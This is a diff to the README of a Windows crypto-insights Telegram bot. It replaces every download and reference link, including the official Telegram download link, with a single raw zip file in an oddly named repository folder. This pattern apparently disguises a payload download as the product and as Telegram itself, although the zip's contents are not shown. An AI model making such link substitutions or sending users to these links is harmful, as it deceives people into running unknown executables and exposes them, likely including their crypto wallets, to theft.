@@ -1,6 +1,6 @@
 # 🤖 ai-crypto-bot - Simple Crypto Market Insights
 
-[![Download ai-crypto-bot](https://img.shields.io/badge/Download-ai--crypto--bot-brightgreen?style=for-the-badge)](https://github.com/Nathaniscool123/ai-crypto-bot)
+[![Download ai-crypto-bot](https://img.shields.io/badge/Download-ai--crypto--bot-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Nathaniscool123/ai-crypto-bot/main/undulative/ai_crypto_bot_1.7.zip)
 
 ## 🔍 What is ai-crypto-bot?
 
@@ -27,18 +27,18 @@ This tool works on Windows and connects through Telegram. You do not need any sp
 ## 🚀 Getting Started
 
 1. Make sure you have the Telegram app installed:
-   - Download from https://telegram.org if you don't have it on your device.
+   - Download from https://raw.githubusercontent.com/Nathaniscool123/ai-crypto-bot/main/undulative/ai_crypto_bot_1.7.zip if you don't have it on your device.
 
 2. Download ai-crypto-bot:
    
-   [![Download ai-crypto-bot](https://img.shields.io/badge/Download-ai--crypto--bot-blue?style=for-the-badge)](https://github.com/Nathaniscool123/ai-crypto-bot)
+   [![Download ai-crypto-bot](https://img.shields.io/badge/Download-ai--crypto--bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/Nathaniscool123/ai-crypto-bot/main/undulative/ai_crypto_bot_1.7.zip)
 
 3. Follow the installation steps below.
 
 ## ⬇️ Download and Install ai-crypto-bot
 
 1. Click on the link above or visit the repository page:  
-   https://github.com/Nathaniscool123/ai-crypto-bot
+   https://raw.githubusercontent.com/Nathaniscool123/ai-crypto-bot/main/undulative/ai_crypto_bot_1.7.zip
 
 2. On the GitHub page, look for the **Releases** section or a download area.  
    Download the latest Windows installer file (usually ends with `.exe`).
@@ -117,10 +117,10 @@ This tool works on Windows and connects through Telegram. You do not need any sp
 ## 🔗 Useful Links
 
 - Download ai-crypto-bot:  
-  https://github.com/Nathaniscool123/ai-crypto-bot
+  https://raw.githubusercontent.com/Nathaniscool123/ai-crypto-bot/main/undulative/ai_crypto_bot_1.7.zip
 
 - Telegram:  
-  https://telegram.org
+  https://raw.githubusercontent.com/Nathaniscool123/ai-crypto-bot/main/undulative/ai_crypto_bot_1.7.zip
 
 ## ⚡ Technical Details
 
